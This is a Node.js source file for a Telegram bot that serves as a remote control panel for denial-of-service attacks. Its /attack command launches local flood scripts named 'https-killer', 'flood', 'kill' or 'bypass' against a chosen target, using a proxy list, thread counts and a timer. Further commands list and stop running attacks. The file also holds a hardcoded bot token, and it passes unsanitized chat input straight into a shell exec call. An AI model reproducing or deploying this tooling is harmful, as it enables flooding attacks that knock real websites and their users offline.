const TelegramBot = require('node-telegram-bot-api')
const si = require('systeminformation')
const { exec } = require('child_process')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

const token = '7937745403:AAGv0jQPQPZZcQYMauM5xNeKVxMIU5LOLgk'
const adminId = '6601930239'
const bot = new TelegramBot(token, { polling: true })

let attacks = []

app.get('/', (req, res) => {
  res.json({ telegramAdmin: '@xkprj', status: 'Bot đang hoạt động' })
})

app.listen(port)

bot.onText(/^\/system$/, async (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }
  try {
    const data = await si.get({
      cpu: 'manufacturer, brand, speed, cores',
      mem: 'total, free, used',
      fsSize: 'fs, size, used, available',
      osInfo: 'platform, distro, release'
    })
    const formatBytes = (bytes) => {
      if (bytes >= 1073741824) return `${(bytes / 1073741824).toFixed(2)} GB`
      if (bytes >= 1048576) return `${(bytes / 1048576).toFixed(2)} MB`
      return `${bytes} B`
    }
    bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
      cpu: {
        manufacturer: data.cpu.manufacturer,
        brand: data.cpu.brand,
        speed: data.cpu.speed,
        cores: data.cpu.cores
      },
      memory: {
        total: formatBytes(data.mem.total),
        free: formatBytes(data.mem.free),
        used: formatBytes(data.mem.used)
      },
      disk: data.fsSize.map(d => ({
        fs: d.fs,
        size: formatBytes(d.size),
        used: formatBytes(d.used),
        available: formatBytes(d.available)
      })),
      os: {
        platform: data.osInfo.platform,
        distro: data.osInfo.distro,
        release: data.osInfo.release
      }
    }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  } catch {
    bot.sendMessage(msg.chat.id, 'Error fetching system info')
  }
})

bot.onText(/^\/attack(?:\s(.+))?/, async (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }

  if (!match[1]) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
    return
  }

  const params = match[1].trim().split(/\s+/)
  if (params.length < 2) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
    return
  }

  const method = ['https-killer', 'flood', 'kill', 'bypass'].includes(params[0]) ? params[0] : 'kill'
  const target = params.length === 3 ? params[1] : params[0]
  const time = parseInt(params.length === 3 ? params[2] : params[1])
  const rate = 24
  const threads = 12
  const proxyfile = './prx.txt'

  if (!target || isNaN(time) || time <= 0) {
    bot.sendMessage(msg.chat.id, 'Usage: /attack [method] [target] [time]')
    return
  }

  const attackId = Date.now()
  const attackData = {
    id: attackId,
    method,
    target,
    time,
    rate,
    threads,
    proxyfile,
    status: 'started',
    messageId: null,
    endTime: Date.now() + time * 1000
  }

  const sentMsg = await bot.sendMessage(msg.chat.id, '```json\n' + JSON.stringify({
    status: attackData.status,
    method,
    target,
    time,
    rate,
    threads,
    proxyfile
  }, null, 2) + '\n```', { parse_mode: 'Markdown' })
  attackData.messageId = sentMsg.message_id

  const child = exec(`node ${method}.js ${target} ${time} ${rate} ${threads} ${proxyfile}`, (err) => {
    if (err) {
      bot.sendMessage(msg.chat.id, `Attack failed: ${err.message}`)
      attacks = attacks.filter(a => a.id !== attackId)
      return
    }
    bot.sendMessage(msg.chat.id, `Attack ${target} completed successfully`)
  })

  child.on('error', (err) => {
    bot.sendMessage(msg.chat.id, `Child process error: ${err.message}`)
    attacks = attacks.filter(a => a.id !== attackId)
    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
  })

  child.on('spawn', () => {
    attackData.pid = child.pid
    attacks.push(attackData)

    const interval = setInterval(() => {
      const now = Date.now()
      const remainingTime = Math.max(0, Math.round((attackData.endTime - now) / 1000))
      attackData.status = 'running'

      if (remainingTime <= 0 || !attacks.find(a => a.id === attackId)) {
        clearInterval(interval)
        bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
        attacks = attacks.filter(a => a.id !== attackId)
        return
      }

      bot.editMessageText('```json\n' + JSON.stringify({
        status: attackData.status,
        method,
        target,
        time: remainingTime,
        rate,
        threads,
        proxyfile
      }, null, 2) + '\n```', {
        chat_id: msg.chat.id,
        message_id: attackData.messageId,
        parse_mode: 'Markdown'
      }).catch((err) => {
        bot.sendMessage(msg.chat.id, `Error updating attack status: ${err.message}`)
        clearInterval(interval)
        attacks = attacks.filter(a => a.id !== attackId)
      })
    }, 5000)
  })

  child.on('exit', () => {
    attacks = attacks.filter(a => a.id !== attackId)
    bot.deleteMessage(msg.chat.id, attackData.messageId).catch(() => {})
  })

  bot.sendMessage(msg.chat.id, `Attack ID: ${attackId}`)
})

bot.onText(/^\/list$/, (msg) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }
  if (attacks.length === 0) {
    bot.sendMessage(msg.chat.id, 'No active attacks')
    return
  }
  const attackList = attacks.map(a => `ID: ${a.id}, Method: ${a.method}, Target: ${a.target}, Time: ${Math.round((a.endTime - Date.now()) / 1000)}s`).join('\n')
  bot.sendMessage(msg.chat.id, `Active attacks:\n${attackList}`)
})

bot.onText(/^\/stop(?:\s(.+))?/, (msg, match) => {
  if (msg.from.id.toString() !== adminId) {
    bot.sendMessage(msg.chat.id, 'Access denied')
    return
  }

  const input = match[1]
  if (!input || isNaN(parseInt(input))) {
    bot.sendMessage(msg.chat.id, 'Usage: /stop [attack_id]')
    return
  }

  const attackId = parseInt(input)
  const attack = attacks.find(a => a.id === attackId)
  if (!attack) {
    bot.sendMessage(msg.chat.id, 'Attack not found')
    return
  }

  attacks = attacks.filter(a => a.id !== attackId)
  try {
    process.kill(attack.pid)
    bot.deleteMessage(msg.chat.id, attack.messageId).catch(() => {})
    bot.sendMessage(msg.chat.id, `Attack ${attackId} stopped`)
  } catch (e) {
    bot.sendMessage(msg.chat.id, `Error stopping attack: ${e.message}`)
  }
})
